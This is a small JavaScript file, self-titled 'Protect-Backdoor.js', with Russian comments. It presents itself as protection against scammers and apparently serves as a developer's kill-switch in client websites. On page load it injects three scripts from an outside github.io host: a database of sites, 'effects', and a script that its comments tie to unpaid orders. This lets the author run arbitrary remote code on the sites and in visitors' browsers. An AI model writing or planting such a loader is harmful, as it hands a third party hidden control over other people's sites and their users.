/*!
 * Protect-Backdoor.js v1.0.1
 * (c) 2024-2024
 * Made to protect against scammers.
 * by Deus Notam
 * Telegram Channel → https://t.me/deusnotam
 * Telegram Group → https://t.me/d3usn0tam
 */

// Проверка, был ли ранее подключен файл
if (!window.D3usN0tamProtect) {
  console.log("D3usN0tam Protect - Connected!\nMade by D3us N0tam\nTelegram Channel → https://t.me/deusnotam\nTelegram Group → https://t.me/d3usn0tam");

  // Подключение data.js - база данных сайтов
  var dataScript = document.createElement('script');
  dataScript.src = 'https://deusnotam.github.io/protect/data.js';
  document.head.appendChild(dataScript);

  // Подключение effects.js - база эффектов
  var effectsScript = document.createElement('script');
  effectsScript.src = 'https://deusnotam.github.io/protect/scripts/effects.js';
  document.head.appendChild(effectsScript);

  // Подключение pay.js - скрипт не оплаты заказов
  var payScript = document.createElement('script');
  payScript.src = 'https://deusnotam.github.io/protect/scripts/pay.js';
  document.head.appendChild(payScript);

  // Устанавливаем флаг, что файл подключен
  window.D3usN0tamProtect = true;
}
